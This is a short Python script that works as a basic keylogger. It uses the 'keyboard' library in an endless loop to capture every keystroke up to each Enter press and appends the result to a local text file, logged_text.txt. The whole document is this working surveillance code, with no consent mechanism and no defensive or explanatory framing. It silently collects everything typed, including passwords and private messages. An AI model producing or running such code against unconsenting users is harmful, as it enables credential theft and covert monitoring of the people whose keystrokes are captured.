import keyboard

while True:
    recorded = keyboard.record(until='enter')

    for i in range(len(recorded)):
        recorded[i] = str(recorded[i])

    log = ' '.join(recorded)

    f = open("logged_text.txt", "a")
    f.write(log)
    f.close()
